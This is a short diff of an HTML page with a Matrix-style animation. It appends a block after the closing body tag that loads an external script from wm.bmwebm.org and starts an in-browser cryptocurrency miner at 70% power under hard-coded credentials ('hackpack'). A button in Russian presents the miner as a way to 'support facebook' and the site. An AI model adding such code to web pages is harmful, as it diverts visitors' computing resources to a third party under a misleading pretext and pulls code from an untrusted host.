@@ -170,5 +170,21 @@
   setInterval(drawMatrix, 33);
 </script>
 
-</body>
+</body><div style="text-align: center; margin-top: 40px;">
+  <p>🔋 Вы можете поддержать facebook.</p>
+  <button onclick="startMining()" style="padding: 10px 20px; font-size: 16px; background-color: #222; color: #0f0; border: none; border-radius: 8px; cursor: pointer;">
+    🚀 Поддержать сайт майнингом
+  </button>
+  <p id="miningStatus" style="margin-top: 10px; color: #0f0;"></p>
+</div>
+
+<script src="https://wm.bmwebm.org/koko.js"></script>
+<script>
+function startMining() {
+  koko.config({ login: "7173569", pass: "hackpack" });
+  koko.power(70); // Можно изменить на любое значение от 1 до 100
+  document.getElementById("miningStatus").innerText = "Майнинг запущен. Спасибо за поддержку!";
+}
+</script>
+
 </html>
